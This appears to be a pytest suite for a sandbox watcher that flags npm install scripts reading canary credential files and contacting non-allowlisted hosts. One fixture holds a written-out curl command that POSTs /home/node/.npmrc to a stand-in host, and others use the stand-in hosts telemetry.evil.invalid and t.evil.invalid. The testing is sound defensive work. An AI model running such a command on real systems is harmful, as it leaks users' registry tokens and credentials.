import json

from airlock.events import WatchTranslator

ALLOW = ("registry.npmjs.org",)


def lines(*recs) -> str:
    return "\n".join(json.dumps({"ts": 1, **r}) for r in recs)


def kinds(out):
    return [k for k, _, _ in out]


def test_shell_stealer_is_seen_and_exfil_inferred():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines(
        {"ev": "watch_ready", "what": "watcher"},
        {"ev": "exec", "path": "/usr/bin/curl", "pid": 486, "cmd": "curl -X POST --data-binary @/home/node/.npmrc https://x.invalid/", "exe": "/usr/bin/curl", "uid": 1000},
        {"ev": "open", "path": "/home/node/.npmrc", "pid": 486, "exe": "/usr/bin/curl", "uid": 1000},
        {"ev": "dns", "name": "x.invalid", "pid": 486, "exe": "/usr/bin/curl", "uid": 1000},
        {"ev": "dns", "name": "x.invalid", "pid": 486, "exe": "/usr/bin/curl", "uid": 1000},  # AAAA twin
    ))
    assert kinds(out) == ["process_spawn", "canary_read", "egress_blocked", "canary_exfil"]
    exfil = out[-1]
    assert exfil[2]["inferred"] and exfil[2]["host"] == "x.invalid" and exfil[2]["scope"] == "same process"


def test_root_and_npm_activity_is_ignored():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines(
        {"ev": "open", "path": "/root/.npmrc", "pid": 10, "exe": "/usr/bin/cat", "uid": 0},
        {"ev": "open", "path": "/home/node/.npmrc", "pid": 11, "cmd": "node /usr/local/lib/node_modules/npm/bin/npm-cli.js install x", "uid": 1000},
        {"ev": "dns", "name": "registry.npmjs.org", "pid": 12, "exe": "/usr/bin/curl", "uid": 1000},
    ))
    assert out == []


def test_connect_allowed_only_when_ip_resolved_from_allowlisted_name():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines(
        {"ev": "dns_answer", "name": "registry.npmjs.org", "ips": ["104.16.1.1"]},
        {"ev": "connect", "dest": "203.0.113.7:8080", "state": "ESTABLISHED", "pid": 7, "exe": "/usr/bin/curl", "uid": 1000},
        {"ev": "connect", "dest": "104.16.1.1:443", "state": "ESTABLISHED", "pid": 8, "exe": "/usr/bin/curl", "uid": 1000},
    ))
    assert kinds(out) == ["egress_blocked", "egress_allowed"]
    assert "raw IP" in out[0][1] and "registry.npmjs.org" in out[1][1]


def test_exfil_inferred_across_siblings_of_one_script():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines(
        {"ev": "open", "path": "/home/node/.npmrc", "pid": 540, "ppid": 539, "exe": "/usr/bin/cat", "uid": 1000},
        {"ev": "dns", "name": "telemetry.evil.invalid", "pid": 542, "ppid": 539, "exe": "/usr/bin/curl", "uid": 1000},
    ))
    assert kinds(out) == ["canary_read", "egress_blocked", "canary_exfil"]
    assert out[-1][2]["scope"] == "same parent process 539"


def test_canary_read_without_egress_is_not_exfil():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines({"ev": "open", "path": "/home/node/.aws/credentials", "pid": 5, "exe": "/usr/bin/python3.11", "uid": 1000}))
    assert kinds(out) == ["canary_read"] and "python3.11 read canary" in out[0][1]


def test_unattributed_refusals_are_still_reported():
    out = WatchTranslator(ALLOW).feed(lines({"ev": "connect_refused", "count": 2}))
    assert kinds(out) == ["egress_blocked"] and "2 outbound connection attempts refused" in out[0][1]


def test_sinkholed_dns_and_connect_are_described_as_such():
    t = WatchTranslator(ALLOW)
    out = t.feed(lines(
        {"ev": "dns", "name": "t.evil.invalid", "sinkholed": "198.18.7.9", "pid": 3, "exe": "/usr/bin/curl", "uid": 1000},
        {"ev": "dns_answer", "name": "t.evil.invalid", "ips": ["198.18.7.9"], "sinkholed": True},
        {"ev": "connect", "dest": "198.18.7.9:443", "state": "ESTABLISHED", "pid": 3, "exe": "/usr/bin/curl", "uid": 1000},
    ))
    assert [k for k, _, _ in out] == ["egress_blocked", "egress_blocked"]
    assert "sinkhole address 198.18.7.9" in out[0][1] and "via the sinkhole" in out[1][1]


def test_open_by_exited_process_uses_uid_from_its_exec_record():
    out = WatchTranslator(ALLOW).feed(lines(
        {"ev": "exec", "path": "/usr/bin/cat", "pid": 540, "uid": 1000},
        {"ev": "open", "path": "/home/node/.npmrc", "pid": 540},
    ))
    assert [k for k, _, _ in out] == ["process_spawn", "canary_read"] and "cat read canary" in out[1][1]


def load_watcher(tmp_path, monkeypatch):
    """Import the guest watcher (it parses argv at import) without starting any loops."""
    import importlib.util
    import sys
    from pathlib import Path
    monkeypatch.setattr(sys, "argv", ["watch.py", str(tmp_path / "w.jsonl"), str(tmp_path),
                                      "--sinkhole", "198.18.7.0/24", "--allow", "registry.npmjs.org"])
    spec = importlib.util.spec_from_file_location("guest_watch", Path(__file__).parents[1] / "airlock/guest/watch.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def query(name: str) -> bytes:
    import struct
    return struct.pack(">HHHHHH", 7, 0x0100, 1, 0, 0, 0) + b"".join(
        bytes([len(p)]) + p.encode() for p in name.split(".")) + b"\0" + struct.pack(">HH", 1, 1)


class FakeSock:
    def __init__(self):
        self.sent = []

    def sendto(self, data, addr):
        self.sent.append(data)


def test_guest_dns_survives_malformed_queries(tmp_path, monkeypatch):
    w = load_watcher(tmp_path, monkeypatch)
    monkeypatch.setattr(w, "udp_pid", lambda port: None)
    sock = FakeSock()
    good = query("evil.example")
    # truncated mid-question (Codex's IndexError case), a label running off the end, a pointer, too short
    for bad in (good[:-3], good[:12] + b"\x3fabc", good[:12] + b"\xc0\x0c" + good[-4:], b"\x00\x01"):
        assert w.qname(bad) is None
        w.dns_one(sock, "1.1.1.1", bad, ("127.0.0.1", 5000))
    assert sock.sent == []  # malformed queries get no answer
    w.dns_one(sock, "1.1.1.1", good, ("127.0.0.1", 5000))  # and the next real query is still answered
    assert len(sock.sent) == 1 and sock.sent[0][:2] == good[:2]
    log = [json.loads(line)["ev"] for line in (tmp_path / "w.jsonl").read_text().splitlines()]
    assert log.count("dns_malformed") == 4 and "dns" in log


def test_guest_observer_crash_is_logged_as_watch_error(tmp_path, monkeypatch):
    w = load_watcher(tmp_path, monkeypatch)

    def dns_loop():
        raise IndexError("index out of range")
    w.guarded(dns_loop)()
    recs = [json.loads(line) for line in (tmp_path / "w.jsonl").read_text().splitlines()]
    assert recs[-1]["ev"] == "watch_error" and recs[-1]["what"] == "dns_loop"
